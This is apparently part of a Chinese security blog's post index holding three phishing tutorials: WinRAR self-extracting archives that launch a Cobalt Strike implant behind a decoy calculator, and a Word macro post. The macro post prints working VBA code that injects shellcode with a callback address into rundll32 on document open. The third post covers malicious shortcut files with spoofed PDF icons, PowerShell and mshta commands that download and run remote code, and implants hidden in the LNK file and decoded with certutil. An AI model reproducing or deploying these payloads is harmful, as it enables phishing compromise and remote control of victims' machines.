+    <title>rar解压自运行(自解压钓鱼)</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/rar%E8%A7%A3%E5%8E%8B%E8%87%AA%E8%BF%90%E8%A1%8C(%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC)/</url>
+    <content><![CDATA[<h5 id="恶意程序准备"><a href="#恶意程序准备" class="headerlink" title="恶意程序准备"></a>恶意程序准备</h5><p>生成CS exe马，可以再准备一个calc.exe用于迷惑</p>
+<p><img src="/images/1665316648984-69e3a37d-c554-4e51-9ef2-39a93fd86958.png"></p>
+<h5 id="使用winrar，选中”创建自解压格式压缩文件”"><a href="#使用winrar，选中”创建自解压格式压缩文件”" class="headerlink" title="使用winrar，选中”创建自解压格式压缩文件”"></a>使用winrar，选中”创建自解压格式压缩文件”</h5><p><img src="/images/1665316829001-9f96854b-93f5-40c5-bff1-4e69e17bb41d.png"></p>
+<p>文件名会自己变为exe后缀</p>
+<h5 id="高级–-gt-设置"><a href="#高级–-gt-设置" class="headerlink" title="高级–&gt;设置"></a>高级–&gt;设置</h5><p><img src="/images/1665316988167-723aed2d-1fc7-4a86-90b8-3f5cc36901a6.png"></p>
+<h5 id="高级–-gt-模式"><a href="#高级–-gt-模式" class="headerlink" title="高级–&gt;模式"></a>高级–&gt;模式</h5><p><img src="/images/1665317056284-a38b3d51-cdeb-49e9-8ca5-3088a767dd7b.png"></p>
+<h5 id="高级–-gt-更新-gt-解压并更新文件，覆盖所有文件"><a href="#高级–-gt-更新-gt-解压并更新文件，覆盖所有文件" class="headerlink" title="高级–&gt;更新 -&gt; 解压并更新文件，覆盖所有文件"></a>高级–&gt;更新 -&gt; 解压并更新文件，覆盖所有文件</h5><p><img src="/images/1665317150871-d5ed23a9-47f4-44d0-a47e-abf3dbb63591.png"></p>
+<h5 id="双击"><a href="#双击" class="headerlink" title="双击"></a>双击</h5><h5 id="先弹出计算器"><a href="#先弹出计算器" class="headerlink" title="先弹出计算器"></a>先弹出计算器</h5><p><img src="/images/1665317918396-40235dea-0ae8-4939-91b8-42409759d59c.png"></p>
+<h5 id="cs成功上线"><a href="#cs成功上线" class="headerlink" title="cs成功上线"></a>cs成功上线</h5><p><img src="/images/1665317977878-2becd632-5ee4-4a3e-afc7-5ed27e5329da.png"></p>
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>在添加压缩包时，勾选两个程序压缩，不要直接压缩文件夹</p>
+<p><img src="/images/1665318023941-7e45189b-7ce7-4048-b810-22cd73e705d4.png"></p>
+<p>否则找不到cs马程序，由于calc就存在于环境变量中，如果选中整个文件夹压缩，则只会弹出计算机</p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>word宏钓鱼(office)</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/word%E5%AE%8F%E9%92%93%E9%B1%BC(office)/</url>
+    <content><![CDATA[<h2 id="在word选项中开启开发工具"><a href="#在word选项中开启开发工具" class="headerlink" title="在word选项中开启开发工具"></a>在word选项中开启开发工具</h2><p><img src="/images/1665293897653-48340ebf-6b7c-492e-9007-ca30f830d18f.png"></p>
+<p><img src="/images/1665293933408-6451566b-7701-449a-a4b6-5c549b170877.png"></p>
+<h2 id="打开宏"><a href="#打开宏" class="headerlink" title="打开宏"></a>打开宏</h2><p><img src="/images/1665294028952-3833e433-91a9-4cca-8079-9dafaab179e2.png"></p>
+<h2 id="Cobalt-Strike生成木马"><a href="#Cobalt-Strike生成木马" class="headerlink" title="Cobalt Strike生成木马"></a>Cobalt Strike生成木马</h2><p><img src="/images/1665294207495-ae047a08-4c43-4175-840d-8014db72527d.png"></p>
+<p><img src="/images/1665294244105-2ded9f7b-9ed4-4bea-8117-3168f994c6da.png"></p>
+<h5 id="cs宏木马"><a href="#cs宏木马" class="headerlink" title="cs宏木马"></a>cs宏木马</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,-66,47,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,105,53,107,83,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82, _</span><br><span class="line">45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80, _</span><br><span class="line">37,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,49,48,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,50,59,32,84,114,105,100,101,110,116,47,54,46,48,59,32,84, _</span><br><span class="line">111,117,99,104,41,13,10,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82, _</span><br><span class="line">45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80, _</span><br><span class="line">37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78, _</span><br><span class="line">84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52, _</span><br><span class="line">40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84, _</span><br><span class="line">45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,49,52,46,53,53,46,49,55,51,46,49,48,54,0,0,0,0,0)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+
+<h2 id="新建宏"><a href="#新建宏" class="headerlink" title="新建宏"></a>新建宏</h2><p><img src="/images/1665295163943-5e1d2dc8-9da3-4be5-b0b1-7b3c4e96b6e6.png"></p>
+<h2 id="把CS生成的宏木马粘贴进去，保存"><a href="#把CS生成的宏木马粘贴进去，保存" class="headerlink" title="把CS生成的宏木马粘贴进去，保存"></a>把CS生成的宏木马粘贴进去，保存</h2><p><img src="/images/1665295205355-ffa67bf5-f5a5-4c21-938a-f672c9a9e30d.png"></p>
+<h2 id="再打开word发现成功上线"><a href="#再打开word发现成功上线" class="headerlink" title="再打开word发现成功上线"></a>再打开word发现成功上线</h2><p><img src="/images/1665295332033-89c74d16-186b-478d-a6de-0c10ba830bd9.png"></p>
+<p>注意，仅适用于office，wps打开没用</p>
+<h2 id="删除宏"><a href="#删除宏" class="headerlink" title="删除宏"></a>删除宏</h2><p><img src="/images/1665295729694-0edd64a9-937b-4983-8e15-b58386074fd4.png"></p>
+<p><img src="/images/1665295750277-409bb8c9-1ef0-4a9b-ad10-c4e2334bceb8.png"></p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>快捷方式钓鱼再谈</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E9%92%93%E9%B1%BC%E5%86%8D%E8%B0%88/</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h5 id="恶意的快捷方式，一般利用方式有如下三种"><a href="#恶意的快捷方式，一般利用方式有如下三种" class="headerlink" title="恶意的快捷方式，一般利用方式有如下三种"></a>恶意的快捷方式，一般利用方式有如下三种</h5><p>通过伪装的lnk文件，执行当前目录下某个恶意文件（一般会设为隐藏文件）</p>
+<p>通过伪装的lnk文件，加载并执行远程的恶意代码</p>
+<p>仅存放一个link文件，执行自身的恶意代码</p>
+<h4 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h4><p>详细在windows相关–&gt;隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attrib +h +s output.apk</span><br></pre></td></tr></table></figure>
+
+<h5 id="Lnk快捷方式执行相对路径程序"><a href="#Lnk快捷方式执行相对路径程序" class="headerlink" title="Lnk快捷方式执行相对路径程序"></a>Lnk快捷方式执行相对路径程序</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe url.dll,FileProtocolHandler xxx.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c start xxx.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>当我们使用cmd时，或是待执行的恶意文件为bat等文件时，会闪出一个黑窗口(一闪而过)，这时可设置其运行方式为”最小化”，以避免此问题。</p>
+<p><img src="/images/1665399584783-4a90924b-8f0c-47fc-a810-77cfb579cc17.png"></p>
+<h2 id="设置快捷方式图标"><a href="#设置快捷方式图标" class="headerlink" title="设置快捷方式图标"></a>设置快捷方式图标</h2><p>之前谈过快捷方式的图标在属性中就可以修改</p>
+<p><img src="/images/1665399815623-547671f3-5d72-439f-b4e7-530b45e210f5.png"></p>
+<p>以pdf文件为例，在windows系统中，pdf文件展示的图标一般是第三方应用的图标，有些默认用chrome打开pdf文件，那pdf文件的图标在他的电脑上就是chrome的图标，有些默认用 Adobe Reader，则pdf文件的图标在他的电脑上是 Adobe Reader图标。</p>
+<p>自定义的图标，在快捷方式中存储的是路径，传到其他主机中，需要将图标文件同时上传，还需要修改路径</p>
+<p><img src="/images/1665400568290-c88146d9-1e75-41fa-9f44-2a81aa0125ed.png"></p>
+<p>怎么将文件的图标随目标系统的默认配置而修改？</p>
+<h2 id="LNK文件的结构"><a href="#LNK文件的结构" class="headerlink" title="LNK文件的结构"></a>LNK文件的结构</h2><p>LNK文件的结构，我们可以找到一个字段: ICON_LOCATION，当设置了 HasIconLocation标识后，可通过 ICON_LOCATION来指定这个快捷方式使用图标。对应了快捷方式属性设置中的”更改图标”操作，如下图所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.lnk 文件格式</span><br><span class="line">+---------------------------+</span><br><span class="line">| lnk file header |</span><br><span class="line">+---------------------------+ &gt;------.</span><br><span class="line">| Shell Item Id List | |</span><br><span class="line">+---------------------------+ |</span><br><span class="line">| File location info | |</span><br><span class="line">+---------------------------+ |</span><br><span class="line">| Description string | |</span><br><span class="line">+---------------------------+ ---</span><br><span class="line">| Relative path string | 这几个节不是每一个都必须存在，如果存在就要按这样的顺序关系排列。</span><br><span class="line">+---------------------------+ ---</span><br><span class="line">| Working directory string | |</span><br><span class="line">+---------------------------+ |</span><br><span class="line">| Command line string | |</span><br><span class="line">+---------------------------+ |</span><br><span class="line">| Icon filename string | |</span><br><span class="line">+---------------------------+ &gt;------.</span><br><span class="line">| Extra stuff |</span><br><span class="line">+---------------------------+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665417001715-4305fe44-bea6-4ea2-95da-b5ba2fe80b08.png"></p>
+<p>这里可以拿010Editor对其进行更改</p>
+<h5 id="创建快捷方式"><a href="#创建快捷方式" class="headerlink" title="创建快捷方式"></a>创建快捷方式</h5><p>注意，要先更换图标，才能进行后续的操作</p>
+<p><img src="/images/1665448852141-39226b39-0239-477a-9946-f1dbb2c9f376.png"></p>
+<p>因为更改图标后010打开才会出现icon字段</p>
+<p><img src="/images/1665449026463-c440ef39-245d-490b-8e58-4e42455e9df2.png"></p>
+<p>更改图标后多出一个ICON_LOCATION字段</p>
+<p><img src="/images/1665449054639-c001cccf-734f-41f9-b24d-ee553bac9a9f.png"></p>
+<p>从21 00开始</p>
+<p><img src="/images/1665401068556-49d67a9a-578d-4596-a01b-66a7f2d0ad33.png"></p>
+<p>将 ICON_LOCATION字段设置为 .\xx.pdf，当然 xx可随意设置，不存在的文件也可。</p>
+<h5 id="将这一段的16进制值改为"><a href="#将这一段的16进制值改为" class="headerlink" title="将这一段的16进制值改为"></a>将这一段的16进制值改为</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2E 00 5C 00 78 00 2E 00 70 00 64 00 66 ......后面都是00....10 00</span><br></pre></td></tr></table></figure>
+
+<h5 id="也可以通过模板直接修改"><a href="#也可以通过模板直接修改" class="headerlink" title="也可以通过模板直接修改"></a>也可以通过模板直接修改</h5><p><img src="/images/1665449148607-4fc1a94d-4fc2-4c19-b1c7-3ec8f0013236.png"></p>
+<p>将ICON_LOCATION字段更改为.\xx.pdf</p>
+<p>这里的xx改成啥都行，不一定是存在的文件名</p>
+<p><img src="/images/1665449361659-84c1501a-3175-4f82-ae7b-2c277af2d638.png"></p>
+<h5 id="可以看到已经更改"><a href="#可以看到已经更改" class="headerlink" title="可以看到已经更改"></a>可以看到已经更改</h5><p><img src="/images/1665449372237-68597204-7e1d-470f-856a-8fc5a08f79a9.png"></p>
+<h5 id="放到其他机器，成功按照默认配置显示"><a href="#放到其他机器，成功按照默认配置显示" class="headerlink" title="放到其他机器，成功按照默认配置显示"></a>放到其他机器，成功按照默认配置显示</h5><p><img src="/images/1665449469739-97141389-28dc-4373-ae25-98d3b281d018.png"></p>
+<h5 id="改为docx"><a href="#改为docx" class="headerlink" title="改为docx"></a>改为docx</h5><p><img src="/images/1665449615993-a1978ba5-f4c6-49e5-b18a-a954c6ccb14b.png"></p>
+<p><img src="/images/1665449654644-b26a1cdd-ff1d-4735-821d-54c1510947b0.png"></p>
+<h5 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h5><p>更换自己的图标后，更改时和ico_Location字段的前两16进制数无关</p>
+<p><img src="/images/1665449969327-f7402ddf-2429-4e63-b3e5-b4cbd722a464.png">‘</p>
+<p>使用自定义的ico，ico_Location中的第一个字段变为19</p>
+<p><img src="/images/1665450085655-738f35b4-d579-4079-8302-b9bd95e5d8bd.png"></p>
+<p>更改ico_Location中的第二个字段为.\xxxx.pdf后仍然有效</p>
+<p><img src="/images/1665450145199-70b7fc0d-971b-4570-895c-fad9710d47f4.png"></p>
+<h2 id="更改快捷方式后缀"><a href="#更改快捷方式后缀" class="headerlink" title="更改快捷方式后缀"></a>更改快捷方式后缀</h2><p>这个直接改就行</p>
+<p><img src="/images/1665451416694-f98ca1eb-6679-4cd2-afb5-586a8c6b1bc6.png"></p>
+<p>双击后仍然弹出计算器</p>
+<p><img src="/images/1665451441107-aab9bf48-9cdf-405f-af74-2aa42095d97a.png"></p>
+<h2 id="执行恶意程序"><a href="#执行恶意程序" class="headerlink" title="执行恶意程序"></a>执行恶意程序</h2><h5 id="执行远程恶意代码"><a href="#执行远程恶意代码" class="headerlink" title="执行远程恶意代码"></a>执行远程恶意代码</h5><p>相对于“执行恶意文件”，该方式仅需一个lnk文件即可完成攻击。</p>
+<p>相当于远程执行命令，可通过mshta、powershell、msiexec、bitsadmin等方式加载远程指令</p>
+<h5 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12280/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665455158285-a07780b0-f8a2-436f-92d3-172649413911.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12280/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\mshta.exe http://xx.xxx/x</span><br></pre></td></tr></table></figure>
+
+<p>当然，以这种形式很很容被检测到，且直接执行这种敏感命令也很难做到免杀。</p>
+<h5 id="点击即上线"><a href="#点击即上线" class="headerlink" title="点击即上线"></a>点击即上线</h5><p><img src="/images/1665455262391-83d350e1-622d-43ea-967b-26c533c572b5.png"></p>
+<h2 id="执行自身恶意代码"><a href="#执行自身恶意代码" class="headerlink" title="执行自身恶意代码"></a>执行自身恶意代码</h2><p>相对于上面的需要从远程加载恶意代码，此方式会将恶意代码藏在lnk文件本身中</p>
+<p>运行时解密释放对应的恶意代码，实现利用</p>
+<h5 id="大致逻辑"><a href="#大致逻辑" class="headerlink" title="大致逻辑"></a>大致逻辑</h5><p>将base64编码后的恶意代码追加至 lnk 文件中</p>
+<p>用findstr提取对应的恶意编码</p>
+<p>certutil -decode对恶意编码进行解码，输出至文件中</p>
+<p>本地执行此文件</p>
+<p>这里以嵌入执行artifact.exe(CS马)为例</p>
+<h5 id="将恶意代码追加写进Lnk文件"><a href="#将恶意代码追加写进Lnk文件" class="headerlink" title="将恶意代码追加写进Lnk文件"></a>将恶意代码追加写进Lnk文件</h5><p>需要注意，在实际的处理中，这一步需要在lnk文件设置完后执行。</p>
+<p>否则更改了lnk的目标后，原本追加的内容会被清空</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf &#x27;\x0d\x0a&#x27; &gt;&gt; evil3.pdf.lnk     # 回车换行</span><br><span class="line">base64 -w 0 calc.exe &gt;&gt; evil3.pdf.lnk  # base64编码后追加进lnk文件</span><br><span class="line">printf &#x27;\x0d\x0a&#x27; &gt;&gt; evil3.pdf.lnk     # 回车换行</span><br></pre></td></tr></table></figure>
+
+<h5 id="首先先把快捷方式做好"><a href="#首先先把快捷方式做好" class="headerlink" title="首先先把快捷方式做好"></a>首先先把快捷方式做好</h5><p>这里用的是计算机的快捷方式，并把图标修改为pdf</p>
+<p><img src="/images/1665456893419-6732528f-be69-4471-bfa8-75d494ee4282.png"></p>
+<h5 id="windows没有printf命令可以用git的bash"><a href="#windows没有printf命令可以用git的bash" class="headerlink" title="windows没有printf命令可以用git的bash"></a>windows没有printf命令可以用git的bash</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf &#x27;\x0d\x0a&#x27; &gt;&gt; cmd.pdf.lnk     # 回车换行</span><br><span class="line">base64 -w 0 artifact.exe &gt;&gt; cmd.pdf.lnk  # base64编码后追加进lnk文件</span><br><span class="line">printf &#x27;\x0d\x0a&#x27; &gt;&gt; cmd.pdf.lnk     # 回车换行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665457436660-0e1931a0-156d-4f54-9726-9672922fc98c.png"></p>
+<h5 id="从0D-0A一直到最后的0D-0A就是我们追加进的木马"><a href="#从0D-0A一直到最后的0D-0A就是我们追加进的木马" class="headerlink" title="从0D 0A一直到最后的0D 0A就是我们追加进的木马"></a>从0D 0A一直到最后的0D 0A就是我们追加进的木马</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0d------回车符号－－－－－－&quot;\r&quot;</span><br><span class="line">0a------换行符号－－－－－－&quot;\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665457676104-165a6e44-8cd9-4c32-8fd1-ec68a836831c.png"></p>
+<h5 id="findstr提取对应的恶意编码"><a href="#findstr提取对应的恶意编码" class="headerlink" title="findstr提取对应的恶意编码"></a>findstr提取对应的恶意编码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /?</span><br><span class="line">在文件中寻找字符串。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665458045962-5cc05b52-b081-4991-ab42-fb2a8684ad09.png"></p>
+<h5 id="base64编码后的前缀是TVqQAAMAAAAEAAA"><a href="#base64编码后的前缀是TVqQAAMAAAAEAAA" class="headerlink" title="base64编码后的前缀是TVqQAAMAAAAEAAA"></a>base64编码后的前缀是TVqQAAMAAAAEAAA</h5><p><img src="/images/1665458144402-e009022e-fd8e-4de6-b92a-7609fd3b0664.png"></p>
+<h5 id="提取出恶意编码，输入到临时文件"><a href="#提取出恶意编码，输入到临时文件" class="headerlink" title="提取出恶意编码，输入到临时文件"></a>提取出恶意编码，输入到临时文件</h5><p>使用findstr对其进行查找，提取出恶意编码，输入到临时文件</p>
+<p>这里需要注意，findstr直接查找 lnk 文件时，会去查找对应的目标文件</p>
+<p>所以需要复制自身为一个普通的二进制文件后再进行查找</p>
+<p>cmd有copy命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy cmd.pdf.lnk ./cmdhack</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665458893172-47f4279c-5d0f-4c15-9be5-42f619aedf41.png"></p>
+<p>findstr提取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr &quot;TVqQAAMAAAAEAAA&quot; ./cmdhack &gt; ./hack</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665458966398-42a23069-5d02-425d-9ca6-75e47102cf80.png"></p>
+<h5 id="certutil-解码提取源文件"><a href="#certutil-解码提取源文件" class="headerlink" title="certutil 解码提取源文件"></a>certutil 解码提取源文件</h5><p>该命令在cmd中即可运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -decode ./hack ./hack.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665459124727-bb6812a6-5658-4148-a4cc-76262d60e76d.png"></p>
+<h5 id="最后一步，运行hack-exe"><a href="#最后一步，运行hack-exe" class="headerlink" title="最后一步，运行hack.exe"></a>最后一步，运行hack.exe</h5><p>成功上线</p>
+<p><img src="/images/1665459202295-1d77853f-1775-48cf-89c1-bf3c93412425.png"></p>
+<h5 id="将上述命令用-amp-串联"><a href="#将上述命令用-amp-串联" class="headerlink" title="将上述命令用&amp;串联"></a>将上述命令用&amp;串联</h5><p>用&amp;&amp;在最后一步执行exe时候会卡住，暂时还不知道为啥</p>
+<p>并将输出的文件放入%temp%（每台机子都有且有权限的路径就行）</p>
+<p>注意路径斜杠的方向</p>
